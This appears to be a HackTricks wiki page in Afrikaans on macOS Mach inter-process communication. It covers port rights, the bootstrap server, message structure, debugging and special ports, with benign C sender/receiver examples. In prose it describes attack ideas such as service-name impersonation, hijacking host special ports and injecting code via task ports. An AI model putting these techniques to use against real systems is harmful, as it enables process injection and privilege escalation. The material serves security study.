# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach gebruik **take** as die **kleinste eenheid** vir die deel van hulpbronne, en elke taak kan **meerdere drade** bevat. Hierdie **take en drade is 1:1 gekarteer na POSIX prosesse en drade**.

Kommunikasie tussen take vind plaas via Mach Inter-Process Communication (IPC), wat eenrigting kommunikasiekanale benut. **Boodskappe word tussen porte oorgedra**, wat optree as **boodskapqueues** wat deur die kernel bestuur word.

'n **Port** is die **basiese** element van Mach IPC. Dit kan gebruik word om **boodskappe te stuur en om** hulle te ontvang.

Elke proses het 'n **IPC tabel**, waar dit moontlik is om die **mach porte van die proses** te vind. Die naam van 'n mach port is eintlik 'n nommer (naanwyser na die kernel objek).

'n Proses kan ook 'n portnaam met sekere regte **na 'n ander taak** stuur en die kernel sal hierdie inskrywing in die **IPC tabel van die ander taak** laat verskyn.

### Port Rights

Port regte, wat definieer watter operasies 'n taak kan uitvoer, is sleutel tot hierdie kommunikasie. Die moontlike **port regte** is ([definisies hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Ontvang reg**, wat die ontvang van boodskappe wat na die port gestuur word, toelaat. Mach porte is MPSC (meervoudige-produsent, enkele-verbruiker) queues, wat beteken dat daar slegs **een ontvang reg vir elke port** in die hele stelsel mag wees (in teenstelling met pype, waar verskeie prosesse almal lêerdeskriptoren na die leeskant van een pyp kan hou).
- 'n **taak met die Ontvang** reg kan boodskappe ontvang en **Stuur regte** skep, wat dit toelaat om boodskappe te stuur. Oorspronklik het slegs die **eie taak die Ontvang reg oor sy port**.
- As die eienaar van die Ontvang reg **sterf** of dit doodmaak, het die **stuur reg nutteloos geword (dode naam).**
- **Stuur reg**, wat die stuur van boodskappe na die port toelaat.
- Die Stuur reg kan **gekloneer** word sodat 'n taak wat 'n Stuur reg besit, die reg kan kloneer en **aan 'n derde taak kan toeken**.
- Let daarop dat **port regte** ook **oorgegee** kan word deur Mac boodskappe.
- **Stuur-een keer reg**, wat die stuur van een boodskap na die port toelaat en dan verdwyn.
- Hierdie reg **kan nie** **gekloneer** word nie, maar dit kan **verplaas** word.
- **Port stel reg**, wat 'n _port stel_ aandui eerder as 'n enkele port. Om 'n boodskap van 'n port stel te verwyder, verwyder 'n boodskap van een van die porte wat dit bevat. Port stelle kan gebruik word om op verskeie porte gelyktydig te luister, baie soos `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Dode naam**, wat nie 'n werklike port reg is nie, maar bloot 'n plekhouer. Wanneer 'n port vernietig word, draai alle bestaande port regte na die port in dode name.

**Take kan STUUR regte aan ander oordra**, wat hulle in staat stel om boodskappe terug te stuur. **STUUR regte kan ook geklonen word, sodat 'n taak die reg kan dupliceer en aan 'n derde taak kan gee**. Dit, saam met 'n intermediêre proses bekend as die **bootstrap server**, stel effektiewe kommunikasie tussen take in staat.

### File Ports

File ports laat toe om lêerdeskriptoren in Mac porte te kapsuleer (met behulp van Mach port regte). Dit is moontlik om 'n `fileport` van 'n gegewe FD te skep met `fileport_makeport` en 'n FD van 'n fileport te skep met `fileport_makefd`.

### Establishing a communication

Soos vroeër genoem, is dit moontlik om regte te stuur met behulp van Mach boodskappe, egter, jy **kan nie 'n reg stuur sonder om reeds 'n reg te hê** om 'n Mach boodskap te stuur nie. So, hoe word die eerste kommunikasie gevestig?

Vir hierdie, is die **bootstrap server** (**launchd** in mac) betrokke, aangesien **enigiemand 'n STUUR reg na die bootstrap server kan kry**, is dit moontlik om dit te vra vir 'n reg om 'n boodskap na 'n ander proses te stuur:

1. Taak **A** skep 'n **nuwe port**, en verkry die **ONTVAAG reg** oor dit.
2. Taak **A**, as die houer van die ONTVANG reg, **genereer 'n STUUR reg vir die port**.
3. Taak **A** vestig 'n **verbinding** met die **bootstrap server**, en **stuur dit die STUUR reg** vir die port wat dit aan die begin gegenereer het.
- Onthou dat enigiemand 'n STUUR reg na die bootstrap server kan kry.
4. Taak A stuur 'n `bootstrap_register` boodskap na die bootstrap server om **die gegewe port met 'n naam te assosieer** soos `com.apple.taska`
5. Taak **B** interaksie met die **bootstrap server** om 'n bootstrap **lookup vir die diens** naam (`bootstrap_lookup`) uit te voer. So die bootstrap server kan antwoordgee, taak B sal 'n **STUUR reg na 'n port wat dit voorheen geskep het** binne die lookup boodskap stuur. As die lookup suksesvol is, sal die **server die STUUR reg** wat van Taak A ontvang is, dupliceer en **aan Taak B oordra**.
- Onthou dat enigiemand 'n STUUR reg na die bootstrap server kan kry.
6. Met hierdie STUUR reg, is **Taak B** in staat om **'n boodskap** **na Taak A** te **stuur**.
7. Vir 'n bi-rigting kommunikasie genereer taak **B** gewoonlik 'n nuwe port met 'n **ONTVAAG** reg en 'n **STUUR** reg, en gee die **STUUR reg aan Taak A** sodat dit boodskappe na TAak B kan stuur (bi-rigting kommunikasie).

Die bootstrap server **kan nie** die diensnaam wat deur 'n taak geclaim word, verifieer nie. Dit beteken 'n **taak** kan potensieel **enige stelseltaak naboots**, soos valslik **'n magtiging diensnaam te claim** en dan elke versoek goedkeur.

Dan, stoor Apple die **name van stelsel-gelewerde dienste** in veilige konfigurasie lêers, geleë in **SIP-beskermde** gidse: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Saam met elke diensnaam, word die **geassosieerde binêre ook gestoor**. Die bootstrap server sal 'n **ONTVAAG reg vir elkeen van hierdie diensname** skep en hou.

Vir hierdie vooraf gedefinieerde dienste, verskil die **lookup proses effens**. Wanneer 'n diensnaam opgevraag word, begin launchd die diens dinamies. Die nuwe werksvloei is soos volg:

- Taak **B** begin 'n bootstrap **lookup** vir 'n diensnaam.
- **launchd** kyk of die taak aan die gang is en as dit nie is nie, **begin** dit.
- Taak **A** (die diens) voer 'n **bootstrap check-in** (`bootstrap_check_in()`) uit. Hier, die **bootstrap** server skep 'n STUUR reg, hou dit, en **oordra die ONTVANG reg aan Taak A**.
- launchd dupliceer die **STUUR reg en stuur dit aan Taak B**.
- Taak **B** genereer 'n nuwe port met 'n **ONTVAAG** reg en 'n **STUUR** reg, en gee die **STUUR reg aan Taak A** (die svc) sodat dit boodskappe na TAak B kan stuur (bi-rigting kommunikasie).

However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.

> [!CAUTION]
> Daarom, launchd moet nooit crash nie of die hele stelsel sal crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Die `mach_msg` funksie, wat essensieel 'n stelselaanroep is, word gebruik om Mach boodskappe te stuur en te ontvang. Die funksie vereis dat die boodskap wat gestuur moet word, as die aanvanklike argument. Hierdie boodskap moet begin met 'n `mach_msg_header_t` struktuur, gevolg deur die werklike boodskapinhoud. Die struktuur is soos volg gedefinieer:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes wat 'n _**receive right**_ besit, kan boodskappe op 'n Mach-port ontvang. Omgekeerd, die **senders** word 'n _**send**_ of 'n _**send-once right**_ toegeken. Die send-once right is eksklusief vir die stuur van 'n enkele boodskap, waarna dit ongeldig word.

Die aanvanklike veld **`msgh_bits`** is 'n bitmap:

- Eerste bit (mees betekenisvolle) word gebruik om aan te dui dat 'n boodskap kompleks is (meer hieroor hieronder)
- Die 3de en 4de word deur die kernel gebruik
- Die **5 minste betekenisvolle bits van die 2de byte** kan gebruik word vir **voucher**: 'n ander tipe port om sleutel/waarde kombinasies te stuur.
- Die **5 minste betekenisvolle bits van die 3de byte** kan gebruik word vir **local port**
- Die **5 minste betekenisvolle bits van die 4de byte** kan gebruik word vir **remote port**

Die tipes wat in die voucher, lokale en afstandspoorte gespesifiseer kan word, is (van [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Byvoorbeeld, `MACH_MSG_TYPE_MAKE_SEND_ONCE` kan gebruik word om te **aandui** dat 'n **send-once** **regte** afgelei en oorgedra moet word vir hierdie poort. Dit kan ook gespesifiseer word as `MACH_PORT_NULL` om te voorkom dat die ontvanger kan antwoordgee.

Om 'n maklike **bi-rigting kommunikasie** te bereik, kan 'n proses 'n **mach poort** in die mach **boodskap kop** spesifiseer wat die _antwoord poort_ (**`msgh_local_port`**) genoem word waar die **ontvanger** van die boodskap 'n **antwoord** op hierdie boodskap kan **stuur**.

> [!TIP]
> Let daarop dat hierdie soort bi-rigting kommunikasie gebruik word in XPC boodskappe wat 'n replay verwag (`xpc_connection_send_message_with_reply` en `xpc_connection_send_message_with_reply_sync`). Maar **gewoonlik word verskillende poorte geskep** soos voorheen verduidelik om die bi-rigting kommunikasie te skep.

Die ander velde van die boodskap kop is:

- `msgh_size`: die grootte van die hele pakket.
- `msgh_remote_port`: die poort waarop hierdie boodskap gestuur word.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: die ID van hierdie boodskap, wat deur die ontvanger geïnterpreteer word.

> [!CAUTION]
> Let daarop dat **mach boodskappe oor 'n `mach poort` gestuur word**, wat 'n **enkele ontvanger**, **meervoudige sender** kommunikasiekanaal is wat in die mach-kern ingebou is. **Meervoudige prosesse** kan **boodskappe** na 'n mach poort stuur, maar op enige tydstip kan slegs **'n enkele proses lees** daarvan.

Boodskappe word dan gevorm deur die **`mach_msg_header_t`** kop gevolg deur die **liggaam** en deur die **trailer** (indien enige) en dit kan toestemming gee om daarop te antwoord. In hierdie gevalle hoef die kern net die boodskap van een taak na die ander oor te dra.

'n **Trailer** is **inligting wat deur die kern aan die boodskap bygevoeg word** (kan nie deur die gebruiker gestel word nie) wat aangevra kan word in boodskap ontvangs met die vlae `MACH_RCV_TRAILER_<trailer_opt>` (daar is verskillende inligting wat aangevra kan word).

#### Kompleks Boodskappe

Daar is egter ander meer **kompleks** boodskappe, soos dié wat addisionele poortregte of gedeelde geheue oordra, waar die kern ook hierdie voorwerpe na die ontvanger moet stuur. In hierdie gevalle word die mees betekenisvolle bit van die kop `msgh_bits` gestel.

Die moontlike beskrywings om oor te dra word gedefinieer in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32-bits is al die beskrywings 12B en die beskrywing tipe is in die 11de. In 64-bits wissel die groottes.

> [!CAUTION]
> Die kernel sal die beskrywings van een taak na die ander kopieer, maar eers **'n kopie in kernelgeheue skep**. Hierdie tegniek, bekend as "Feng Shui", is in verskeie exploits misbruik om die **kernel data in sy geheue te laat kopieer**, wat 'n proses in staat stel om beskrywings na homself te stuur. Dan kan die proses die boodskappe ontvang (die kernel sal hulle vrylaat).
>
> Dit is ook moontlik om **poortregte na 'n kwesbare proses te stuur**, en die poortregte sal net in die proses verskyn (selfs al hanteer hy dit nie).

### Mac Ports APIs

Let daarop dat poorte aan die taaknaamruimte geassosieer is, so om 'n poort te skep of te soek, word die taaknaamruimte ook gevra (meer in `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Skep** 'n poort.
- `mach_port_allocate` kan ook 'n **poortstel** skep: ontvangreg oor 'n groep poorte. Wanneer 'n boodskap ontvang word, word die poort aangedui van waar dit gekom het.
- `mach_port_allocate_name`: Verander die naam van die poort (standaard 32-bis heelgetal)
- `mach_port_names`: Kry poortname van 'n teiken
- `mach_port_type`: Kry regte van 'n taak oor 'n naam
- `mach_port_rename`: Hernoem 'n poort (soos dup2 vir FD's)
- `mach_port_allocate`: Toekenning van 'n nuwe ONTVANG, POORT_STEL of DOOD_NAAM
- `mach_port_insert_right`: Skep 'n nuwe reg in 'n poort waar jy ONTVANG het
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funksies wat gebruik word om **mach boodskappe te stuur en te ontvang**. Die oorskrywing weergawe laat toe om 'n ander buffer vir boodskapontvangs te spesifiseer (die ander weergawe sal dit net hergebruik).

### Debug mach_msg

Aangesien die funksies **`mach_msg`** en **`mach_msg_overwrite`** diegene is wat gebruik word om ontvang boodskappe te stuur, sal die instelling van 'n breekpunt op hulle toelaat om die gestuurde en ontvangde boodskappe te inspekteer.

Byvoorbeeld, begin om enige toepassing te debug wat jy kan debug, aangesien dit **`libSystem.B` sal laai wat hierdie funksie sal gebruik**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Proses 71019 gelaai: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Proses 71019 gestop
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Teiken 0: (SandboxedShellApp) gestop.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Om die argumente van **`mach_msg`** te kry, kyk na die registers. Dit is die argumente (van [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Kry die waardes van die registers:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Kontroleer die boodskapkop en kyk na die eerste argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Die tipe `mach_msg_bits_t` is baie algemeen om 'n antwoord toe te laat.

### Tel poorte op
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Die **naam** is die standaardnaam wat aan die poort gegee word (kyk hoe dit **toeneem** in die eerste 3 bytes). Die **`ipc-object`** is die **obfuscated** unieke **identifiseerder** van die poort.\
Let ook op hoe die poorte met slegs **`send`** regte die **eienaar** daarvan **identifiseer** (poortnaam + pid).\
Let ook op die gebruik van **`+`** om **ander take wat aan dieselfde poort gekoppel is** aan te dui.

Dit is ook moontlik om [**procesxp**](https://www.newosxbook.com/tools/procexp.html) te gebruik om ook die ** geregistreerde diensname** te sien (met SIP gedeaktiveer weens die behoefte aan `com.apple.system-task-port`):
```
procesp 1 ports
```
U kan hierdie hulpmiddel op iOS installeer deur dit af te laai van [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Kode voorbeeld

Let op hoe die **sender** 'n poort **toewys**, 'n **send reg** vir die naam `org.darlinghq.example` skep en dit na die **bootstrap bediener** stuur terwyl die sender om die **send reg** van daardie naam gevra het en dit gebruik het om 'n **boodskap** te **stuur**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Bevoorregte Poorte

Daar is 'n paar spesiale poorte wat toelaat om **sekere sensitiewe aksies uit te voer of sekere sensitiewe data te bekom** in die geval dat 'n taak die **SEND** regte oor hulle het. Dit maak hierdie poorte baie interessant vanuit 'n aanvaller se perspektief, nie net vanweë die vermoëns nie, maar omdat dit moontlik is om **SEND regte oor take te deel**.

### Gasheer Spesiale Poorte

Hierdie poorte word deur 'n nommer verteenwoordig.

**SEND** regte kan verkry word deur **`host_get_special_port`** aan te roep en **ONTVAAG** regte deur **`host_set_special_port`** aan te roep. egter, beide oproepe vereis die **`host_priv`** poort waartoe slegs root toegang het. Boonop was root in die verlede in staat om **`host_set_special_port`** aan te roep en arbitrêre te kap, wat byvoorbeeld toegelaat het om kodehandtekeninge te omseil deur `HOST_KEXTD_PORT` te kap (SIP voorkom dit nou).

Hierdie is in 2 groepe verdeel: Die **eerste 7 poorte behoort aan die kernel**, wat die 1 `HOST_PORT`, die 2 `HOST_PRIV_PORT`, die 3 `HOST_IO_MASTER_PORT` en die 7 is `HOST_MAX_SPECIAL_KERNEL_PORT` is.\
Diegene wat **begin** met die nommer **8** behoort aan **sisteem daemons** en hulle kan in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) verklaar word.

- **Gasheerpoort**: As 'n proses **SEND** voorreg oor hierdie poort het, kan hy **inligting** oor die **stelsel** verkry deur sy roetines aan te roep soos:
- `host_processor_info`: Kry prosessorinligting
- `host_info`: Kry gasheerinligting
- `host_virtual_physical_table_info`: Virtuele/Fisiese bladsy tabel (vereis MACH_VMDEBUG)
- `host_statistics`: Kry gasheerstatistieke
- `mach_memory_info`: Kry kernel geheue uitleg
- **Gasheer Priv poort**: 'n Proses met **SEND** reg oor hierdie poort kan **bevoorregte aksies** uitvoer soos om opstartdata te wys of te probeer om 'n kernel uitbreiding te laai. Die **proses moet root wees** om hierdie toestemming te verkry.
- Boonop, om die **`kext_request`** API aan te roep, is dit nodig om ander regte **`com.apple.private.kext*`** te hê wat slegs aan Apple binêre gegee word.
- Ander roetines wat aangeroep kan word, is:
- `host_get_boot_info`: Kry `machine_boot_info()`
- `host_priv_statistics`: Kry bevoorregte statistieke
- `vm_allocate_cpm`: Toewys Aaneengeskakelde Fisiese Geheue
- `host_processors`: Stuur reg na gasheerprosessoren
- `mach_vm_wire`: Maak geheue resident
- Aangesien **root** toegang tot hierdie toestemming kan verkry, kan dit `host_set_[special/exception]_port[s]` aanroep om **gasheer spesiale of uitsondering poorte te kap**.

Dit is moontlik om **alle gasheer spesiale poorte te sien** deur te loop:
```bash
procexp all ports | grep "HSP"
```
### Taak Spesiale Poorte

Hierdie is poorte wat gereserveer is vir goed bekende dienste. Dit is moontlik om hulle te kry/instel deur `task_[get/set]_special_port` aan te roep. Hulle kan gevind word in `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Van [hier](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Die poort wat gebruik word om hierdie taak te beheer. Gebruik om boodskappe te stuur wat die taak beïnvloed. Dit is die poort wat teruggegee word deur **mach_task_self (sien Taak Poorte hieronder)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Die taak se bootstrap poort. Gebruik om boodskappe te stuur wat die terugkeer van ander stelseldiens poorte versoek.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Die poort wat gebruik word om inligting van die bevatende gasheer aan te vra. Dit is die poort wat teruggegee word deur **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Die poort wat die bron benoem waaruit hierdie taak sy bedrade kerngeheue trek.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Die poort wat die bron benoem waaruit hierdie taak sy standaard geheue bestuurde geheue trek.

### Taak Poorte

Oorspronklik het Mach nie "prosesse" gehad nie, dit het "take" gehad wat meer soos 'n houer van drade beskou is. Toe Mach met BSD saamgevoeg is, **was elke taak gekorreleerd met 'n BSD-proses**. Daarom het elke BSD-proses die besonderhede wat dit nodig het om 'n proses te wees en elke Mach-taak het ook sy innerlike werking (behalwe vir die nie-bestaande pid 0 wat die `kernel_task` is).

Daar is twee baie interessante funksies wat hiermee verband hou:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Kry 'n SEND reg vir die taak poort van die taak wat verband hou met die spesifieke `pid` en gee dit aan die aangeduide `target_task_port` (wat gewoonlik die oproepende taak is wat `mach_task_self()` gebruik het, maar kan 'n SEND poort oor 'n ander taak wees).
- `pid_for_task(task, &pid)`: Gegee 'n SEND reg aan 'n taak, vind uit watter PID hierdie taak verband hou.

Om aksies binne die taak uit te voer, het die taak 'n `SEND` reg na homself nodig gehad deur `mach_task_self()` aan te roep (wat die `task_self_trap` (28) gebruik). Met hierdie toestemming kan 'n taak verskeie aksies uitvoer soos:

- `task_threads`: Kry SEND reg oor alle taak poorte van die drade van die taak
- `task_info`: Kry inligting oor 'n taak
- `task_suspend/resume`: Suspend of hervat 'n taak
- `task_[get/set]_special_port`
- `thread_create`: Skep 'n draad
- `task_[get/set]_state`: Beheer taaktoestand
- en meer kan gevind word in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Let daarop dat met 'n SEND reg oor 'n taak poort van 'n **ander taak**, dit moontlik is om sulke aksies oor 'n ander taak uit te voer.

Boonop is die task_port ook die **`vm_map`** poort wat toelaat om **geheue te lees en te manipuleer** binne 'n taak met funksies soos `vm_read()` en `vm_write()`. Dit beteken basies dat 'n taak met SEND regte oor die task_port van 'n ander taak in staat gaan wees om **kode in daardie taak in te spuit**.

Onthou dat omdat die **kern ook 'n taak is**, as iemand daarin slaag om 'n **SEND toestemming** oor die **`kernel_task`** te verkry, sal dit in staat wees om die kern enigiets te laat uitvoer (jailbreaks).

